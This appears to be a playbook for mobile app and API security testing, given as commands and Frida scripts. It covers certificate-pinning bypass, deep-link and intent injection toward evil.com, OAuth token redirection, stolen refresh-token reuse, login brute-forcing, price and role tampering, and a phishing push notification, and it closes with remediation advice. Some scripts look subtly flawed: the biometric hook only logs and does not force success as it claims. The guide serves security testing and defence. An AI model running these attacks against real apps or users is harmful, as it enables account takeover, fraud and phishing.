---
name: mobile_api
description: Mobile API and mobile application security testing covering certificate pinning, deep link abuse, API authentication, and mobile-specific attack vectors
---

# Mobile API Security

Mobile applications expose unique attack surfaces beyond standard web APIs: dedicated endpoints, custom headers, certificate pinning, deep links, on-device storage, and binary packaging. Mobile APIs frequently differ from their web counterparts in authentication, rate limiting, and data returned — making them high-value targets.

## 1. Mobile API Discovery

### Endpoint Identification

```bash
# Common mobile API path prefixes
for prefix in "/api/mobile/" "/api/v1/mobile/" "/mapi/" "/api/app/" "/api/native/" \
  "/mobile/v1/" "/api/v2/mobile/" "/app-api/" "/gateway/mobile/" "/api/android/" "/api/ios/"; do
  code=$(curl -so /dev/null -w "%{http_code}" "https://api.target.com${prefix}")
  [ "$code" != "404" ] && echo "[+] ${prefix} → $code"
done
```

### Mobile-Specific Headers

```bash
# Test with mobile user agents to get different responses
curl -H "User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7)" \
     -H "X-Device-ID: abc123-device-id" \
     -H "X-Platform: android" \
     -H "X-App-Version: 3.2.1" \
     -H "X-App-Build: 321" \
     -H "X-OS-Version: 13" \
     https://api.target.com/api/users/me

# iOS variant
curl -H "User-Agent: AppName/1.2.3 (iPhone; iOS 17.0; Scale/3.00)" \
     -H "X-Device-ID: ios-uuid-here" \
     -H "X-Platform: ios" \
     -H "X-App-Version: 1.2.3" \
     https://api.target.com/api/users/me

# Compare mobile vs web responses
diff <(curl -s -H "User-Agent: Mozilla/5.0" https://api.target.com/api/users/me) \
     <(curl -s -H "User-Agent: Dalvik/2.1.0" https://api.target.com/api/users/me)
```

### API Version Differences

```bash
# Mobile APIs often lag behind in versions or use separate versioning
curl https://api.target.com/api/v1/users/me    # web
curl https://api.target.com/api/mobile/v1/users/me  # mobile — may have different fields

# Mobile may still expose deprecated endpoints
for v in v1 v2 v3; do
  resp=$(curl -s -H "User-Agent: Dalvik/2.1.0" "https://api.target.com/api/$v/admin/users")
  echo "[+] /api/$v/admin/users → $(echo $resp | head -c 200)"
done
```

## 2. Certificate Pinning

### Detection

```bash
# Check if app uses pinning by attempting MITM proxy
# If requests fail through proxy but work directly → pinning likely

# Android: Check network_security_config.xml
apktool d target.apk -o target_decompiled
cat target_decompiled/res/xml/network_security_config.xml

# Look for pin-set declarations
grep -r "pin-set\|certificate.*pin\|TrustManager\|OkHttp.*CertificatePinner" target_decompiled/

# iOS: Check Info.plist for NSAppTransportSecurity / NSPinnedDomains
# Look in the IPA for pinned certificate files (.cer, .der, .pem)
find target_decrypted/ -name "*.cer" -o -name "*.der" -o -name "*.pem"
```

### Bypass Techniques

```bash
# Frida — universal SSL unpinning script
frida -U -f com.target.app -l ssl-unpin.js --no-pause

# ssl-unpin.js content (one-shot bypass):
cat > ssl-unpin.js << 'EOF'
Java.perform(function() {
  var TrustManager = Java.registerClass({
    name: 'com.custom.TrustManager',
    implements: [Java.use('javax.net.ssl.X509TrustManager')],
    methods: {
      checkClientTrusted: function(chain, authType) {},
      checkServerTrusted: function(chain, authType) {},
      getAcceptedIssuers: function() { return []; }
    }
  });
  var SSLContext = Java.use('javax.net.ssl.SSLContext');
  var ctx = SSLContext.getInstance('TLS');
  ctx.init(null, [TrustManager.$new()], null);
  Java.use('OkHttpClient$Builder').sslContext.value = ctx;
});
EOF

# Objection — runtime exploration + SSL bypass
objection -g com.target.app explore
# Inside objection:
# android sslpinning disable
# ios sslpinning disable

# apk-mitm (automated repackaging)
apk-mitm target.apk
# Produces target-patched.apk with pinning removed

# Burp Suite with custom CA cert installed on device
# For rooted Android: install PortSwigger CA in system trust store
# Settings → Security → Install from SD card → burp.der
```

### Pinning Validation Weaknesses

```bash
# Some apps only validate the leaf cert, not the CA chain
# Test by presenting a valid leaf cert signed by a different CA
# Generate a leaf cert for the target domain
openssl req -new -x509 -keyout leaf.key -out leaf.crt -days 365 \
  -subj "/CN=api.target.com"

# If app accepts this → CA chain not validated (weak pinning)
```

## 3. Deep Link / URL Scheme Abuse

### Discover Registered Schemes

```bash
# Android — parse AndroidManifest.xml
apktool d target.apk -o target_decompiled
grep -r "android:scheme\|android:host\|android:pathPrefix\|android:pathPattern" \
  target_decompiled/AndroidManifest.xml

# Common patterns:
# <data android:scheme="targetapp" android:host="open" />
# <data android:scheme="https" android:host="target.com" android:pathPrefix="/share" />

# iOS — parse Info.plist
# Extract IPA, find Info.plist
unzip target.ipa -d target_ipa
plutil -convert xml1 -o - target_ipa/Payload/*.app/Info.plist | grep -A5 "CFBundleURLSchemes"

# Or use frida to enumerate at runtime
frida -U com.target.app -e "
  var schemes = ObjC.classes.NSBundle.mainBundle().infoDictionary()
    .objectForKey_('CFBundleURLTypes');
  console.log(schemes);
"
```

### Deep Link Injection

```bash
# Android — test intent injection via adb
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://open?url=https://evil.com"

# Test parameter injection
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://profile?id=1&admin=true"

# Test path traversal in deep link
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://file/../../../etc/passwd"

# iOS — test universal link bypass
# Craft an apple-app-site-association that redirects
# Test via: xcrun simctl openurl booted "https://target.com/redirect?to=https://evil.com"
```

### Intent Injection (Android)

```bash
# Exported activities accepting arbitrary intents
adb shell am start -n com.target.app/.ExportedActivity \
  --es "url" "https://evil.com" \
  --es "token" "stolen_value"

# Test with deeplink
adb shell am start -a android.intent.action.VIEW \
  -d "targetapp://webview?url=file:///data/data/com.target.app/shared_prefs/auth.xml"
```

## 4. Mobile-Specific Auth Issues

### Hardcoded API Keys

```bash
# Decompile and search for secrets
apktool d target.apk -o target_decompiled
jadx target.apk -o target_jadx

# Search for common secret patterns
grep -rni "api_key\|apikey\|secret\|password\|token\|aws_access\|firebase\|google_api" \
  target_jadx/sources/ target_decompiled/res/values/strings.xml

# Search for base64-encoded secrets
grep -rnoP '[A-Za-z0-9+/]{40,}={0,2}' target_jadx/sources/ | while read line; do
  echo "$line" | cut -d: -f3 | base64 -d 2>/dev/null | grep -qi "key\|secret\|token" && echo "[+] $line"
done

# Check for hardcoded credentials in strings
strings target.apk | grep -iE "password|secret|api.key|bearer|authorization"
```

### JWT Token Storage

```bash
# Check SharedPreferences for stored tokens (rooted device)
adb shell run-as com.target.app cat shared_prefs/*.xml | grep -i "token\|jwt\|session\|auth"

# Check SQLite databases
adb shell run-as com.target.app databases/*.db
sqlite3 auth.db "SELECT * FROM tokens;"

# Check if tokens are stored in plaintext vs encrypted
adb shell "find /data/data/com.target.app/ -name '*.xml' -o -name '*.db' -o -name '*.json'" \
  | while read f; do adb shell "cat $f" 2>/dev/null | grep -i "token\|jwt"; done
```

### Biometric Bypass

```bash
# Frida script to bypass biometric authentication
cat > biobypass.js << 'EOF'
Java.perform(function() {
  var BiometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt');
  var CryptoObject = Java.use('android.hardware.biometrics.BiometricPrompt$CryptoObject');
  
  // Hook authentication callback to force success
  Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationCallback')
    .onAuthenticationSucceeded.implementation = function(result) {
      console.log('[+] Biometric bypassed — calling success');
      this.onAuthenticationSucceeded(result);
    };
});
EOF
frida -U -f com.target.app -l biobypass.js --no-pause
```

### OAuth Redirect URI Manipulation

```bash
# Mobile OAuth often uses custom schemes — test for open redirect
# Legitimate: targetapp://oauth/callback
# Attack: targetapp://oauth/callback#access_token=STOLEN

# Test if redirect_uri accepts arbitrary schemes
curl "https://auth.target.com/authorize?client_id=mobile_app&redirect_uri=https://evil.com/callback&response_type=token"

# Test custom scheme hijacking (Android — register same scheme)
# If app registers: <data android:scheme="targetapp" />
# Another app can register the same scheme and intercept tokens

# Refresh token abuse — stolen refresh token may work across devices
curl -X POST https://auth.target.com/token \
  -d "grant_type=refresh_token&refresh_token=STOLEN_REFRESH_TOKEN&client_id=mobile_app"
```

## 5. Mobile API Testing

### Parameter Tampering

```bash
# Mobile APIs may have weaker server-side validation
# Intercept and modify requests via Burp/Frida

# Price manipulation
# Original: {"item_id": 123, "price": 9.99, "quantity": 1}
curl -X POST https://api.target.com/api/mobile/v1/order \
  -H "Authorization: Bearer $TOKEN" \
  -H "User-Agent: Dalvik/2.1.0" \
  -d '{"item_id": 123, "price": 0.01, "quantity": 1}'

# Role escalation via parameter injection
curl -X PUT https://api.target.com/api/mobile/v1/profile \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name": "test", "role": "admin", "is_verified": true}'
```

### Rate Limit Differences

```bash
# Mobile endpoints often have looser rate limits (mobile = higher trust)
# Compare rate limiting between web and mobile APIs
for i in $(seq 1 100); do
  code=$(curl -so /dev/null -w "%{http_code}" \
    -H "User-Agent: Dalvik/2.1.0" \
    -X POST https://api.target.com/api/mobile/v1/login \
    -d "user=admin&pass=wrong")
  echo "Attempt $i: $code"
  [ "$code" = "429" ] && echo "[!] Rate limited at attempt $i" && break
done

# Same test with web UA for comparison
for i in $(seq 1 100); do
  code=$(curl -so /dev/null -w "%{http_code}" \
    -H "User-Agent: Mozilla/5.0" \
    -X POST https://api.target.com/api/v1/login \
    -d "user=admin&pass=wrong")
  echo "Attempt $i: $code"
  [ "$code" = "429" ] && echo "[!] Rate limited at attempt $i" && break
done
```

### API Response Differences

```bash
# Mobile APIs sometimes leak extra fields (debug info, internal IDs, PII)
diff <(curl -s -H "User-Agent: Mozilla/5.0" \
        -H "Authorization: Bearer $TOKEN" \
        https://api.target.com/api/v1/users/me | jq -S .) \
     <(curl -s -H "User-Agent: Dalvik/2.1.0" \
        -H "Authorization: Bearer $TOKEN" \
        https://api.target.com/api/mobile/v1/users/me | jq -S .)

# Look for: internal_user_id, email_verified, raw_phone, admin_flag, debug_enabled
```

### Push Notification Abuse

```bash
# Check if push notification tokens are predictable or reusable
# FCM tokens can be used to send notifications if server trust is misconfigured
curl -X POST https://fcm.googleapis.com/v1/projects/PROJECT_ID/messages:send \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "message": {
      "token": "TARGET_DEVICE_FCM_TOKEN",
      "notification": {
        "title": "Phishing",
        "body": "Click here to verify your account"
      },
      "webpush": {
        "fcm_options": {"link": "https://evil.com"}
      }
    }
  }'
```

## 6. Binary Analysis Basics

### APK Decompilation

```bash
# jadx — decompile to readable Java source
jadx target.apk -o target_jadx/
# Browse: target_jadx/sources/com/target/

# apktool — decode resources + smali
apktool d target.apk -o target_apktool/
# Browse: target_apktool/smali/com/target/

# String extraction
strings target.apk | grep -iE "http[s]?://|api\.|secret|key|token|password|firebase" | sort -u

# Find all URLs in decompiled source
grep -rhoP 'https?://[^\s"\x27]+' target_jadx/sources/ | sort -u

# Dex2jar + JD-GUI for alternative decompilation
d2j-dex2jar target.apk -o target-dex2jar.jar
# Open target-dex2jar.jar in JD-GUI
```

### IPA Decompilation

```bash
# Decrypt IPA first (requires jailbroken device or frida-ios-dump)
frida-ios-dump -U -d com.target.app

# class-dump — extract Objective-C headers
class-dump -H target_decrypted.app -o target_headers/

# Ghidra — full decompilation for native code
# Import the Mach-O binary into Ghidra, analyze, search for strings

# Swift demangling
xcrun swift-demangle $(nm target_decrypted.app/target | awk '{print $3}')

# Search for secrets in binary
strings target_decrypted.app/target | grep -iE "api[_-]?key|secret|token|https?://|firebase"
```

### Code Signing Verification

```bash
# Android — verify APK signing
apksigner verify --print-certs target.apk

# Check if debug-signed (vulnerability: debug keys in production)
keytool -printcert -jarfile target.apk | grep -i "owner\|issuer\|valid"

# iOS — verify provisioning profile
codesign -dvvv target.app 2>&1 | grep -i "authority\|identifier\|entitlements"
security cms -D -i target.app/embedded.mobileprovision
```

## 7. Key Vulnerabilities

### Insecure Data Storage
```bash
# Check for sensitive data in logs
adb logcat -d | grep -iE "password|token|ssn|credit|secret|api.key"

# Check for data in world-readable locations
adb shell "find /sdcard/ -name '*target*' -o -name '*.json' -o -name '*.db'" \
  | while read f; do adb shell "cat $f" 2>/dev/null; done
```

### WebView Vulnerabilities
```bash
# Check if JavaScript is enabled in WebViews
grep -r "setJavaScriptEnabled\|addJavascriptInterface" target_jadx/sources/

# JavaScript interface → potential RCE on older Android
grep -r "addJavascriptInterface" target_jadx/sources/ -l

# Check for file access in WebViews
grep -r "setAllowFileAccess\|setAllowContentAccess\|setAllowFileAccessFromFileURLs" \
  target_jadx/sources/
```

### Insecure Communication
```bash
# Check if app allows cleartext traffic
grep -r "usesCleartextTraffic\|cleartextTrafficPermitted" target_decompiled/

# Check network_security_config for overly permissive settings
cat target_decompiled/res/xml/network_security_config.xml
# Look for: <base-config cleartextTrafficPermitted="true">
# Look for: <trust-anchors><certificates src="user" /></trust-anchors>
```

## 8. Validation

When a mobile API vulnerability is found:

1. **Reproduce**: Demonstrate the issue with a concrete request/response or binary evidence
2. **Impact**: Show what data or actions are exposed (PII, admin functions, financial manipulation)
3. **Scope**: Note if the issue is Android-only, iOS-only, or cross-platform
4. **Tool Evidence**: Include frida output, decompiled code snippets, or intercepted traffic

## 9. Remediation

### Certificate Pinning
- Implement certificate pinning with backup pins
- Validate the full certificate chain, not just the leaf
- Use `network_security_config.xml` (Android) or `NSPinnedDomains` (iOS)

### Secure Storage
- Use Android Keystore / iOS Keychain for secrets
- Never store tokens in SharedPreferences (Android) or NSUserDefaults (iOS)
- Encrypt all data at rest; use hardware-backed storage where available

### Deep Links & Intents
- Validate all deep link parameters server-side
- Use `exported="false"` for internal activities (Android)
- Implement App Links (Android) / Universal Links (iOS) with proper verification

### Authentication
- Use OAuth 2.0 PKCE flow for mobile clients
- Never hardcode API keys in binaries — use secure server-side key exchange
- Implement token binding to device identifiers
- Use biometric authentication as a step-up factor, not sole gatekeeper

### API Hardening
- Enforce identical rate limiting across mobile and web endpoints
- Never return additional fields to mobile clients that aren't shown in UI
- Validate all parameters server-side regardless of client type
- Use TLS 1.2+ with strong cipher suites exclusively
